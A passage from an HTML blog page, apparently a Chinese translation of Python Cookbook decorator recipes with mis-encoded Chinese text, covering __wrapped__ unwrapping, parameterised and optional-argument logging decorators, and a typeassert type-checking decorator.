href="#è§£é™¤ä¸€ä¸ªè£…é¥°å™¨" class="headerlink" title="è§£é™¤ä¸€ä¸ªè£…é¥°å™¨"></a>è§£é™¤ä¸€ä¸ªè£…é¥°å™¨</h4><p>ç°åœ¨ä¸€ä¸ªè£…é¥°å™¨å·²ç»ä½œç”¨åœ¨ä¸€ä¸ªå‡½æ•°ä¸Šï¼Œä½ æƒ³æ’¤é”€å®ƒï¼Œç›´æ¥è®¿é—®åŸå§‹çš„æœªåŒ…è£…çš„é‚£ä¸ªå‡½æ•°ã€‚å‡è®¾è£…é¥°å™¨æ˜¯é€šè¿‡<code>@wraps</code>æ¥å®ç°çš„ï¼Œé‚£ä¹ˆä½ å¯ä»¥é€šè¿‡è®¿é—®<code>__wrapped__</code>å±æ€§æ¥è®¿é—®åŸå§‹å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@somedecorator</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> x + y</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>orig_add = add.__wrapped__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>orig_add(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="number">7</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®æœªåŒ…è£…çš„åŸå§‹å‡½æ•°åœ¨è°ƒè¯•ã€å†…çœå’Œå…¶ä»–å‡½æ•°æ“ä½œæ—¶æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚ä½†æ˜¯è¿™é‡Œçš„æ–¹æ¡ˆä»…ä»…é€‚ç”¨äºåœ¨åŒ…è£…å™¨ä¸­æ­£ç¡®ä½¿ç”¨äº†<code>@wraps</code>æˆ–è€…ç›´æ¥è®¾ç½®äº†<code>__wrapped__</code>å±æ€§çš„æƒ…å†µã€‚</p><p>å¦‚æœæœ‰å¤šä¸ªåŒ…è£…å™¨ï¼Œé‚£ä¹ˆè®¿é—®<code>__wrapped__</code>å±æ€§çš„è¡Œä¸ºæ˜¯ä¸å¯é¢„çŸ¥çš„ï¼Œåº”è¯¥é¿å…è¿™æ ·åšã€‚åœ¨<code>Python3.3</code>ä¸­ï¼Œå®ƒä¼šç•¥è¿‡æ‰€æœ‰çš„åŒ…è£…å±‚ï¼Œæ¯”å¦‚ï¼Œå‡å¦‚ä½ æœ‰å¦‚ä¸‹çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator1</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        print(<span class="string">'Decorator 1'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator2</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        print(<span class="string">'Decorator 2'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@decorator1</span></span><br><span class="line"><span class="meta">@decorator2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure><p>åœ¨<code>Python3.3</code>æµ‹è¯•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Decorator <span class="number">1</span></span><br><span class="line">Decorator <span class="number">2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add.__wrapped__(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>åœ¨<code>Python3.4</code>æµ‹è¯•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Decorator <span class="number">1</span></span><br><span class="line">Decorator <span class="number">2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add.__wrapped__(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Decorator <span class="number">2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„è£…é¥°å™¨éƒ½ä½¿ç”¨äº†<code>@wraps</code>ï¼Œå› æ­¤è¿™é‡Œçš„æ–¹æ¡ˆå¹¶ä¸å…¨éƒ¨ä½¿ç”¨ï¼Œç‰¹åˆ«çš„ï¼Œå†…ç½®çš„è£…é¥°å™¨<code>@staticmethod</code>å’Œ<code>@classmethod</code>å°±æ²¡æœ‰éµå¾ªè¿™ä¸ªçº¦å®šã€‚</p><h4 id="å®šä¹‰ä¸€ä¸ªå¸¦å‚æ•°çš„è£…é¥°å™¨"><a href="#å®šä¹‰ä¸€ä¸ªå¸¦å‚æ•°çš„è£…é¥°å™¨" class="headerlink" title="å®šä¹‰ä¸€ä¸ªå¸¦å‚æ•°çš„è£…é¥°å™¨"></a>å®šä¹‰ä¸€ä¸ªå¸¦å‚æ•°çš„è£…é¥°å™¨</h4><p>æˆ‘ä»¬ç”¨ä¸€ä¸ªä¾‹å­è¯¦ç»†é˜è¿°ä¸‹æ¥å—å‚æ•°çš„å¤„ç†è¿‡ç¨‹ã€‚å‡è®¾ä½ æƒ³å†™ä¸€ä¸ªè£…é¥°å™¨ï¼Œç»™å‡½æ•°æ·»åŠ æ—¥å¿—åŠŸèƒ½ï¼ŒåŒæ—¶å…è®¸ç”¨æˆ·æŒ‡å®šæ—¥å¿—çš„çº§åˆ«å’Œå…¶ä»–çš„é€‰é¡¹ã€‚ä¸‹é¢æ˜¯è¿™ä¸ªè£…é¥°å™¨çš„å®šä¹‰å’Œä½¿ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logged</span><span class="params">(level, name=None, message=None)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorate</span><span class="params">(func)</span>:</span></span><br><span class="line">        logname = name <span class="keyword">if</span> name <span class="keyword">else</span> func.__module__</span><br><span class="line">        log = logging.getLogger(logname)</span><br><span class="line">        logmsg = message <span class="keyword">if</span> message <span class="keyword">else</span> func.__name__</span><br><span class="line"></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            log.log(level, logmsg)</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorate</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç¤ºä¾‹</span></span><br><span class="line"><span class="meta">@logged(logging.DEBUG)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="meta">@logged(logging.CRITICAL, 'example')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Spam!'</span>)</span><br></pre></td></tr></table></figure><p>åˆçœ‹è¿™ç§å®ç°çœ‹ä¸Šå»å¾ˆå¤æ‚ï¼Œä½†æ˜¯æ ¸å¿ƒæ€æƒ³å¾ˆç®€å•ã€‚æœ€å¤–å±‚çš„å‡½æ•°<code>logged()</code>æ¥å—å‚æ•°å¹¶å°†å®ƒä»¬ä½œç”¨åœ¨å†…éƒ¨çš„è£…é¥°å™¨å‡½æ•°ä¸Šé¢ã€‚å†…å±‚çš„å‡½æ•°<code>decorate()</code>æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œç„¶ååœ¨å‡½æ•°ä¸Šé¢æ”¾ç½®ä¸€ä¸ªåŒ…è£…å™¨ã€‚è¿™é‡Œçš„å…³é”®ç‚¹æ˜¯åŒ…è£…å™¨æ˜¯å¯ä»¥ä½¿ç”¨ä¼ é€’ç»™<code>logged()</code>çš„å‚æ•°çš„ã€‚</p><h4 id="å¯è‡ªå®šä¹‰å±æ€§çš„è£…é¥°å™¨"><a href="#å¯è‡ªå®šä¹‰å±æ€§çš„è£…é¥°å™¨" class="headerlink" title="å¯è‡ªå®šä¹‰å±æ€§çš„è£…é¥°å™¨"></a>å¯è‡ªå®šä¹‰å±æ€§çš„è£…é¥°å™¨</h4><p>å¦‚æœæƒ³å†™ä¸€ä¸ªè£…é¥°å™¨æ¥åŒ…è£…ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”å…è®¸ç”¨æˆ·æä¾›å‚æ•°åœ¨è¿è¡Œæ—¶æ§åˆ¶è£…é¥°å™¨è¡Œä¸ºã€‚å¯ä»¥å¼•å…¥ä¸€ä¸ªè®¿é—®å‡½æ•°ï¼Œä½¿ç”¨<code>nonlocal</code>æ¥ä¿®æ”¹å†…éƒ¨å˜é‡ã€‚ç„¶åè¿™ä¸ªè®¿é—®å‡½æ•°è¢«ä½œä¸ºä¸€ä¸ªå±æ€§èµ‹å€¼ç»™åŒ…è£…å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps, partial</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach_wrapper</span><span class="params">(obj, func=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> partial(attach_wrapper, obj)</span><br><span class="line">    setattr(obj, func.__name__, func)</span><br><span class="line">    <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logged</span><span class="params">(level, name=None, message=None)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorate</span><span class="params">(func)</span>:</span></span><br><span class="line">        logname = name <span class="keyword">if</span> name <span class="keyword">else</span> func.__module__</span><br><span class="line">        log = logging.getLogger(logname)</span><br><span class="line">        logmsg = message <span class="keyword">if</span> message <span class="keyword">else</span> func.__name__</span><br><span class="line"></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            log.log(level, logmsg)</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="meta">        @attach_wrapper(wrapper)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">set_level</span><span class="params">(newlevel)</span>:</span></span><br><span class="line">            <span class="keyword">nonlocal</span> level</span><br><span class="line">            level = newlevel</span><br><span class="line"></span><br><span class="line"><span class="meta">        @attach_wrapper(wrapper)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">set_message</span><span class="params">(newmsg)</span>:</span></span><br><span class="line">            <span class="keyword">nonlocal</span> logmsg</span><br><span class="line">            logmsg = newmsg</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorate</span><br><span class="line"></span><br><span class="line"><span class="meta">@logged(logging.DEBUG)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="meta">@logged(logging.CRITICAL, 'example')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Spam!'</span>)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯äº¤äº’ç¯å¢ƒä¸‹çš„ä½¿ç”¨ä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> logging</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">DEBUG:__main__:add</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Change the log message</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add.set_message(<span class="string">'Add called'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">DEBUG:__main__:Add called</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Change the log level</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add.set_level(logging.WARNING)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">WARNING:__main__:Add called</span><br><span class="line"><span class="number">5</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€å°èŠ‚çš„å…³é”®ç‚¹åœ¨äºè®¿é—®å‡½æ•°(å¦‚<code>set_message()</code>å’Œ<code>set_level()</code>)ï¼Œå®ƒä»¬è¢«ä½œä¸ºå±æ€§èµ‹ç»™åŒ…è£…å™¨ã€‚æ¯ä¸ªè®¿é—®å‡½æ•°å…è®¸ä½¿ç”¨<code>nonlocal</code>æ¥ä¿®æ”¹å‡½æ•°å†…éƒ¨çš„å˜é‡ã€‚</p><h4 id="å¸¦å¯é€‰å‚æ•°çš„è£…é¥°å™¨"><a href="#å¸¦å¯é€‰å‚æ•°çš„è£…é¥°å™¨" class="headerlink" title="å¸¦å¯é€‰å‚æ•°çš„è£…é¥°å™¨"></a>å¸¦å¯é€‰å‚æ•°çš„è£…é¥°å™¨</h4><p>å¦‚æœæƒ³å†™ä¸€ä¸ªè£…é¥°å™¨ï¼Œæ—¢å¯ä»¥ä¸ä¼ å‚æ•°ç»™å®ƒï¼Œæ¯”å¦‚<code>@decorator</code>ï¼Œ ä¹Ÿå¯ä»¥ä¼ é€’å¯é€‰å‚æ•°ç»™å®ƒï¼Œæ¯”å¦‚<code>@decorator(x,y,z)</code>ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps, partial</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logged</span><span class="params">(func=None, *, level=logging.DEBUG, name=None, message=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> partial(logged, level=level, name=name, message=message)</span><br><span class="line"></span><br><span class="line">    logname = name <span class="keyword">if</span> name <span class="keyword">else</span> func.__module__</span><br><span class="line">    log = logging.getLogger(logname)</span><br><span class="line">    logmsg = message <span class="keyword">if</span> message <span class="keyword">else</span> func.__name__</span><br><span class="line"></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        log.log(level, logmsg)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example use</span></span><br><span class="line"><span class="meta">@logged</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="meta">@logged(level=logging.CRITICAL, name='example')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Spam!'</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>@logged</code>è£…é¥°å™¨å¯ä»¥åŒæ—¶ä¸å¸¦å‚æ•°æˆ–å¸¦å‚æ•°ã€‚</p><h4 id="åˆ©ç”¨è£…é¥°å™¨å¼ºåˆ¶å‡½æ•°ä¸Šçš„ç±»å‹æ£€æŸ¥"><a href="#åˆ©ç”¨è£…é¥°å™¨å¼ºåˆ¶å‡½æ•°ä¸Šçš„ç±»å‹æ£€æŸ¥" class="headerlink" title="åˆ©ç”¨è£…é¥°å™¨å¼ºåˆ¶å‡½æ•°ä¸Šçš„ç±»å‹æ£€æŸ¥"></a>åˆ©ç”¨è£…é¥°å™¨å¼ºåˆ¶å‡½æ•°ä¸Šçš„ç±»å‹æ£€æŸ¥</h4><p>è¿™é‡Œçš„ç›®æ ‡æ˜¯èƒ½å¯¹å‡½æ•°å‚æ•°ç±»å‹è¿›è¡Œæ–­è¨€ï¼Œç±»ä¼¼ä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@typeassert(int, int)</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> x + y</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="string">'hello'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"contract.py"</span>, line <span class="number">33</span>, <span class="keyword">in</span> wrapper</span><br><span class="line">TypeError: Argument y must be &lt;<span class="class"><span class="keyword">class</span> '<span class="title">int</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä½¿ç”¨è£…é¥°å™¨æŠ€æœ¯æ¥å®ç°<code>@typeassert</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> inspect <span class="keyword">import</span> signature</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">typeassert</span><span class="params">(*ty_args, **ty_kwargs)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorate</span><span class="params">(func)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> __debug__:</span><br><span class="line">            <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line">        sig = signature(func)</span><br><span class="line">        bound_types = sig.bind_partial(*ty_args, **ty_kwargs).arguments</span><br><span class="line"></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            bound_values = sig.bind(*args, **kwargs)</span><br><span class="line">            <span class="keyword">for</span> name, value <span class="keyword">in</span> bound_values.arguments.items():</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">in</span> bound_types:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, bound_types[name]):</span><br><span class="line">                        <span class="keyword">raise</span> TypeError(</span><br><span class="line">                            <span class="string">'Argument &#123;&#125; must be &#123;&#125;'</span>.format(name, bound_types[name])</span><br><span class="line">                            )</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorate</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¿™ä¸ªè£…é¥°å™¨éå¸¸çµæ´»ï¼Œæ—¢å¯ä»¥æŒ‡å®šæ‰€æœ‰å‚æ•°ç±»å‹ï¼Œä¹Ÿå¯ä»¥åªæŒ‡å®šéƒ¨åˆ†ã€‚å¹¶ä¸”å¯ä»¥é€šè¿‡ä½ç½®æˆ–å…³é”®å­—æ¥æŒ‡å®šå‚æ•°ç±»å‹ã€‚ä¸‹é¢æ˜¯ä½¿ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@typeassert(int, z=int)</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(x, y, z=<span class="number">42</span>)</span>:</span></span><br><span class="line"><span class="meta">... </span>    print(x, y, z)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>spam(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>spam(<span class="number">1</span>, <span class="string">'hello'</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> hello <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>spam(<span class="number">1</span>, <span class="string">'hello'</span>, <span class="string">'world'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">"contract.py"</span>, line <span class="number">33</span>, <span class="keyword">in</span> wrapper</span><br><span class="line">TypeError: Argument z must be &lt;<span class="class"><span class="keyword">class</span> '<span class="title">int</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å°†è£…é¥°å™¨å®šä¹‰ä¸ºç±»çš„ä¸€éƒ¨åˆ†"><a href="#å°†è£…é¥°å™¨å®šä¹‰ä¸ºç±»çš„ä¸€éƒ¨åˆ†" class="headerlink" title="å°†è£…é¥°å™¨å®šä¹‰ä¸ºç±»çš„ä¸€éƒ¨åˆ†"></a>å°†è£…é¥°å™¨å®šä¹‰ä¸ºç±»çš„ä¸€éƒ¨åˆ†</h4><p>å¦‚æœæƒ³åœ¨ç±»ä¸­å®šä¹‰è£…é¥°å™¨ï¼Œå¹¶å°†å…¶ä½œç”¨åœ¨å…¶ä»–å‡½æ•°æˆ–æ–¹æ³•ä¸Šã€‚é¦–å…ˆè¦ç¡®è®¤å®ƒçš„ä½¿ç”¨æ–¹å¼ï¼Œæ¯”å¦‚åˆ°åº•æ˜¯ä½œä¸ºä¸€ä¸ªå®ä¾‹æ–¹æ³•è¿˜æ˜¯ç±»æ–¹æ³•ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 